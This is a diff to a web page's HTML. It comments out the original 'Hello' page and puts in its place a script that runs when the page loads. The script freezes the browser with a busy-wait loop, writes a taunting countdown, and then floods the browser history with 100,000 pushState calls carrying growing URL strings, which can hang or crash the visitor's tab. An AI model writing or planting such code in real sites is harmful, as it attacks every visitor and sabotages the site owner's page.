@@ -1,6 +1,6 @@
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
   "http://www.w3.org/TR/html4/loose.dtd">
-
+<!--
 <html>
 <head>
   <title>Hello</title>
@@ -75,3 +75,53 @@ pageTracker._trackPageview();
 
 </body>
 </html>
+-->
+
+
+
+
+
+
+
+<html>
+  <head>
+    <script>
+      function sleep(miliseconds) {
+   var currentTime = new Date().getTime();
+
+   while (currentTime + miliseconds >= new Date().getTime()) {
+   }
+}
+      </script>
+    <script>
+      document.write("Get out of here in ");
+      document.write("3 ");
+      sleep(1000);
+      document.write("2 ");
+      sleep(1000);
+      document.write("1 ");
+      sleep(1000);
+      document.write("\<title\>What were you expecting?????\<\/title\>");
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+    </script>
+  </head>
+  
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
